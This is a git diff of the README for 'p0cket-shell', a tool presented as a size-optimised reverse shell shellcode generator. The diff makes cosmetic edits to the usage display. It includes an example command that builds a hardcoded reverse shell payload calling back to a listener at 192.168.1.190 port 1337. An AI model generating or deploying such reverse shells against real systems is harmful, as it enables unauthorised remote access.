@@ -9,8 +9,7 @@
 p0cket-shell is an implementation of an exceptionally compact reverse shell, engineered to achieve remote access with the smallest possible memory. This is minimalism without compromising functionality. This is the most size-efficient reverse shell available. This is peak shellcode optimization.
 
 ```
-╭── тишина ∴ ~\source\gits\p0cket-shell
-╰─→ .\p0cket-shell.py
+p0cket-shell.py
             ____       __        __             __         ____
      ____  / __ \_____/ /_____  / /_      _____/ /_  ___  / / /
     / __ \/ / / / ___/ //_/ _ \/ __/_____/ ___/ __ \/ _ \/ / /
@@ -45,7 +44,7 @@ p0cket-shell.py --payload  [hardcode | resolve]
 ### Example
 
 ```
-.\p0cket-shell.py -p hardcode -lh 192.168.1.190 -lp 1337 -f python
+p0cket-shell.py -p hardcode -lh 192.168.1.190 -lp 1337 -f python
             ____       __        __             __         ____
      ____  / __ \_____/ /_____  / /_      _____/ /_  ___  / / /
     / __ \/ / / / ___/ //_/ _ \/ __/_____/ ___/ __ \/ _ \/ / /
